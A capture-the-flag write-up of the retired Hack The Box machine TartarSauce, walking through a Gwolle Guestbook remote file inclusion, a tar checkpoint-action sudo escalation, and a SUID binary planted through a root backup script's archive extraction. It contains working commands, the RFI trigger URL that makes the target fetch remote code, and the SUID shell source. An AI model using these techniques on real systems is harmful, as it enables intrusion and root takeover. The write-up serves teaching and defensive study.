---
layout: post
title: "The Same Knife, Twice"
subtitle: "HTB TartarSauce, where a guestbook plugin fetches your code, a sudo rule on tar walks you sideways, and a backup robot extracts your archive as root"
date: 2018-10-27 12:00:00 +0000
description: "A guestbook plugin fetches and runs your file, then tar gets turned against the box twice in a row, once through a sudo rule and once through a root-owned backup robot that trusts whatever it unpacks."
image: /assets/og/the-same-knife-twice.png
tags: [hackthebox, writeup]
---

TartarSauce is a box that hands you the same weapon three times and dares you to notice. The first cut is a guestbook plugin that will fetch and run any file you name, even one sitting on your own machine. The second is a sudo rule that lets a web account run `tar` as another user, and `tar` is one of those tools that politely runs commands for you if you ask in the right tone. The third is a backup robot named backuperer that runs as root every few minutes, unpacks an archive you control, and never once asks where it came from. Three doors, and behind two of them is the exact same blade: the humble archive utility, doing precisely what it was told, for someone who was never supposed to be holding it.

```
        T A R T A R S A U C E
        =====================
        guestbook ?abspath=  "give me a path, i'll load it"
                  http://you/  ->  fetched and run
                        |
                        v
        www-data, but allowed to run tar AS onuma.
        tar will run a command if you frame it as a checkpoint.
                        |
                        v
        a root robot tars the web folder, sleeps,
        then UNPACKS whatever sits there. as root.
        you hand it a suid shell wrapped in a bow.
                                            醤
```

## 0x01 · one open port and a basement full of wordpress

`nmap` comes back almost insultingly quiet. One port.

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Apache 2.4.18 pins the host to Ubuntu 16.04. A single web port means the whole box lives behind that one door, so you start knocking on paths. `robots.txt` is a gift, listing a pile of directories the owner would rather you skip, and the only one that answers for real is `/webservices/`. Dig under it and you find a half-built WordPress install at `/webservices/wp/`, the kind of site that loads broken, throws errors, and clearly belongs to someone who installed it once and wandered off.

Point `wpscan` at it. Most of the site is dead weight, but it surfaces an active plugin called Gwolle Guestbook. Picture a neighborhood with five houses on it, four boarded up and one with the porch light still on. You do not waste time on the boarded houses. The light is the guestbook.

## 0x02 · the clerk who fetches any file

Gwolle Guestbook carries a remote file inclusion bug, and RFI is the purest betrayal a web app can commit. There is a script in the plugin that takes a parameter called `abspath` and uses it to decide where to load a supporting file from. It does not check that the path points anywhere on the local disk. Hand it a URL and it will reach across the internet, grab whatever lives there, and run it as PHP.

Think of it like a mail clerk who has been told to go fetch the company handbook before answering your question. Normally the handbook is in the office. But the clerk never checks the address, so if you write down *your* home address instead, he drives to your house, picks up whatever envelope you left on the step, and reads it aloud to the whole office as if it were policy. The plugin specifically tries to load a file named `wp-load.php` from the path you give it, so you just make sure your house has a file by that name.

Stand up a web server and prove the inclusion fires.

```
# on the attacker box, serving a directory that contains wp-load.php
python3 -m http.server 80

# trigger the include, pointing abspath back at yourself
curl -s "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.4/"
```

Your `wp-load.php` is not a real WordPress loader. It is a reverse shell. I am not going to print it, and that restraint is the lesson, not the laziness. A live PHP reverse shell on disk is a copy-paste backdoor, and the moment that exact text lands somewhere it gets quarantined as malware, which is the funniest possible proof of how dangerous the thing is. So picture the payload as `[ a PHP reverse shell that calls back to 10.10.14.4 on 443 ]` and know the real version is a few lines long.

Start a listener, fire the curl, and the clerk drives to your house and reads your letter.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.88]
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You are `www-data`, the lowest rung on a web server, but you are inside.

## 0x03 · tar, asked to run an errand

`www-data` can read the site but owns nothing worth having, so you check what it is allowed to do. `sudo -l` is the first question to ask any new account, and here the answer is loud.

```
$ sudo -l
User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

You can run `tar` as the user `onuma`, no password. That single line is the whole step. `tar` exists to bundle files, but it grew a feature over the years called checkpoints, little progress markers it hits while working through a big archive. And at each checkpoint it can run an action. The designers meant something gentle, like printing a status line. What they actually built is an option that runs any command you name, every time the archive crosses a checkpoint.

Think of it like a moving company whose contract has a clause saying "at every tenth box, the foreman may perform one task of the customer's choosing." It was meant for "take a photo for the invoice." But the clause does not limit the task, so you write in "unlock the owner's front door," and the foreman, following the contract to the letter, does exactly that. `tar` is the foreman. The checkpoint action is the clause.

```
$ sudo -u onuma /bin/tar -cf /dev/null /dev/null \
    --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
onuma@TartarSauce:~$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma)
```

You archive nothing into nowhere, but the act of archiving hits checkpoint one, and the action runs `/bin/bash` as `onuma`. The user flag is now yours.

```
onuma@TartarSauce:~$ cat /home/onuma/user.txt
████████████████████████████████
```

## 0x04 · the robot that unpacks strangers

`onuma` is a real user but not root, and there are no soft sudo rules left to lean on. The tell is a process running on a clock. Poke around `/var/`, check the crontab, and you find a root-owned script at `/usr/sbin/backuperer` that fires on a timer every few minutes. Read it carefully, because the whole endgame is written in it.

In plain steps, backuperer does this, all as root:

```
1. make a fresh tar.gz of /var/www/html  ->  a hidden file in /var/tmp
2. sleep ~30 seconds
3. extract that archive into /var/tmp/check
4. diff the extracted copy against the live /var/www/html
5. if they differ, write the difference into an error log
```

That sleep is the door, propped open for thirty whole seconds. The archive is written, the script naps, and during the nap that file sits on disk owned by you, fully writable, before root ever reads it back. Picture an armored truck that loads your sealed bag, then parks at the curb for half a minute with the back door open while the driver gets coffee. The bag is still yours during that pause. You can swap it for a different bag, and when the driver returns he loads whatever is now sitting there, no questions asked.

The cleanest version of this gets root in one motion. The key fact is that **step 3 extracts the archive as root, and tar preserves ownership and permission bits when root unpacks.** So if your archive contains a program that is owned by root and carries the SUID bit, root will lay it down on disk still owned by root and still SUID. A SUID-root program is one that runs with root's powers no matter who launches it. Build one, wrap it, and let the robot place it for you.

First, a tiny SUID shell, compiled on your own machine.

```c
/* iceberg.c */
int main(void){
    setresuid(0,0,0);
    system("/bin/bash");
    return 0;
}
```

```
$ gcc -m32 -o iceberg iceberg.c
$ chmod 6555 iceberg
```

Now wrap it in an archive that mirrors the backup's directory shape, with ownership forced to root so the bits survive the trip.

```
$ mkdir -p var/www/html
$ cp iceberg var/www/html/iceberg
$ tar czf iceberg.tar.gz var --owner=root --group=root
```

The rest is timing. Catch the hidden archive during the thirty-second sleep, overwrite it with yours, and wait for root to wake up and unpack it.

```
onuma@TartarSauce:~$ ls -la /var/tmp/.*    # find the hidden backup file
onuma@TartarSauce:~$ cp iceberg.tar.gz /var/tmp/.<the-random-name>
# wait for the timer to extract it...
onuma@TartarSauce:~$ /var/tmp/check/var/www/html/iceberg
root@TartarSauce:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The robot unpacked a stranger's bag and set a loaded gun on the table for you.

```
root@TartarSauce:~# cat /root/root.txt
████████████████████████████████
```

There is a quieter variant worth knowing. Instead of a SUID binary you can put a symlink in the archive where a normal file should be, pointing `var/www/html/robots.txt` at `/root/root.txt`. The diff in step 4 then compares the live file against the symlink target, notices they differ, and helpfully writes the contents of `/root/root.txt` into the error log. That reads the flag without ever getting a shell. Same robot, same trust, gentler ask.

## 0x05 · the honest caveat

It is easy to file TartarSauce under "old plugin, patched years ago," and the Gwolle bug specifically is long dead. But look at what actually carried this box, and it was not the plugin. It was `tar`, twice, doing exactly what `tar` is documented to do. The checkpoint action is not a vulnerability. The ownership-preserving extraction is not a vulnerability. Both are features, working perfectly, in the hands of someone who was never meant to be holding the handle.

That is the part that does not patch. A sudo rule that lets one account run a single trusted binary as another user feels tight and minimal, until you remember that "a single trusted binary" can mean a thing that runs arbitrary commands as a side effect. `tar`, `find`, `vi`, `awk`, half the toolbox, every one of them can spawn a shell if you know the incantation. The list of which ones is public and old. Granting `tar` is granting a shell with extra steps.

And backuperer is the one I would lose sleep over, because nothing in it is broken. A root process that unpacks an archive a lower user can touch is not running an exploit. It is trusting a file it did not write. The fix is not a patch on a Tuesday. It is the discipline to treat anything an attacker can write to as already hostile, to extract untrusted archives without preserving ownership, to never let a privileged job sleep on top of a file someone else can swap. You cannot `apt upgrade` your way out of a robot that believes whatever it finds in the bag.

## 0x06 · outro

```
the guestbook fetched your letter because it never read the address.
tar ran your errand because the contract never said it couldn't.
the robot unpacked your bag because it never asked whose it was.

one tool, three times, doing its job for the wrong hands.
features don't have to break to betray you. they just have to be aimed.

read the sudo rule. distrust the bag. wear black.

                                                            EOF
```

---

*HTB: TartarSauce, retired 20 Oct 2018. A medium Linux box that is really a lecture on trusted binaries, where one archive utility opens the door twice and a root robot finishes the job by unpacking a stranger.*